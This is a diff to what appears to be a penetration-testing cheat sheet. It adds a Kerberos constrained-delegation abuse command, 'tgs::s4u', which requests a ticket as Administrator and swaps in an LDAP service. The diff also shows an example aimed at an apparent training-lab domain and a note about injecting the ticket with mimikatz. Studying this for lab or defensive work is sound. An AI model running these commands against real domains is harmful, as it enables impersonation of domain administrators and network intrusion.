@@ -402,6 +402,11 @@ tgt::ask /user:<user-or-machine$> /domain:<domain> /rc4:<hash>
 ```
 ask tgs and force ldap service tgs:
 ```
+tgs::s4u /tgt:<TGT-Generated-Before>/user:<user>@<domain> /service:<service>|<service_to_add>
+```
+
+ex: 
+```
 tgs::s4u /tgt:<TGT-Generated-Before>/user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.local
 ```
 then inject the ticket with mimikatz:
